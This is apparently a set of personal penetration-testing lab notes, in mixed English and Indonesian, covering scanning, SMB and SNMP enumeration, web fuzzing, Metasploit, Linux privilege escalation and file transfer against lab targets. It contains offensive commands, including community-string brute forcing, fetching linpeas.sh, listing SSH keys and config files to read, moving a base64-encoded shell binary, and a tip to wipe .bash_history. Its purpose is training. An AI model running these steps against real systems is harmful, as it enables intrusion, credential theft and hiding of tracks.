# Getting Started

# Service Scanning

## nmap

```shell-session
nmap -sV -sC -p- 10.129.42.253
```

We can use the `-sC` parameter to specify that `Nmap` scripts should be used to try and obtain more detailed information. The `-sV` parameter instructs `Nmap` to perform a version scan

Specifying `-sC` will run many useful default scripts against a target, but there are cases when running a specific script is required.

```shell-session
locate scripts/citrix
```
## ftp (default port 21)

```shell-session
ftp -p 10.129.42.253
```

## smb

discover smb

```shell-session
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```

The Metasploit Framework has several [modules](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/) for EternalBlue that can be used to validate the vulnerability and exploit it, as we will see in a coming section

Check shares

```shell-session
smbclient -N -L \\\\10.129.42.253
```
```shell-session
smbclient \\\\10.129.42.253\\users
```
```shell-session
smbclient -U bob \\\\10.129.42.253\\users
```

## snmp
```shell-session
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
``````shell-session
snmpwalk -v 2c -c private  10.129.42.253
```

A tool such as [onesixtyone](https://github.com/trailofbits/onesixtyone) can be used to brute force the community string names using a dictionary file of common community strings such as the `dict.txt` file included in the GitHub repo for the tool.

```shell-session
onesixtyone -c dict.txt 10.129.42.254
```

# Web Enumeration

## Gobuster

### Dir enum

```sh
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### DNS Subdomain enum

First, add a DNS Server such as 1.1.1.1 to the `/etc/resolv.conf` file. Then

```shell-session
gobuster dns -d inlanefreight.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt
```

https://github.com/FortyNorthSecurity/EyeWitness

### Vhost enum

```shell-session
gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

## Whatweb

```shell-session
whatweb 10.10.10.121
```

```shell-session
whatweb --no-errors 10.10.10.0/24
```

## Banner grabbing

```shell-session
curl -IL https://www.inlanefreight.com
```

Other:
* Certificate
* robots.txt
* Source code

# Public Exploits

Find in  exploitdb

```
searchsploit <keywords>
```

# Metasploit

Open console

```
msfconsole
```

Search for exploit

```
search exploit <keywords>
use <path/to/exploit>
```

Preparation

```
show options
set RHOSTS <IP/domain>
set LHOSTS tun0
check
exploit
```

Output:
* File inside cwd
* Meterpreter

# Privilege Escalation

Tool bagus: [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) (janlup bersih2 `.bash_history`)

```sh
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

## Check current privileges

```sh
sudo -l
(<user_name> : <user_name>) NOPASSWD: /bin/bash
```

```
sudo -su <user_name>
```

To check:
* CRON
	* /etc/crontab
	* /etc/cron.d
	* /var/spool/cron/crontabs/root
* Exposed credentials/log
	* ~/.bash_history
	* /var/www/html/config.php
* File ssh
	* ~/.ssh
	* ~/.ssh/id_rsa
	* ~/.ssh/authorized_keys
	* ato apapun itu
* Berpetualang ria

https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html

Checklist
https://github.com/swisskyrepo/PayloadsAllTheThings

# Transfer File (Exploits)

## wget

```sh
wget <link>
```

```sh
python3 -m http.server 8000
```
## scp

```sh
scp [-P <PORT>] [-i <privkeyfile>] <file> user@remotehost:/tmp/linenum.sh
```

## base64

```
base64 shell -w 0
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... | base64 -d > shell
```

## validate

```
file <file>
md5sum <file>
```
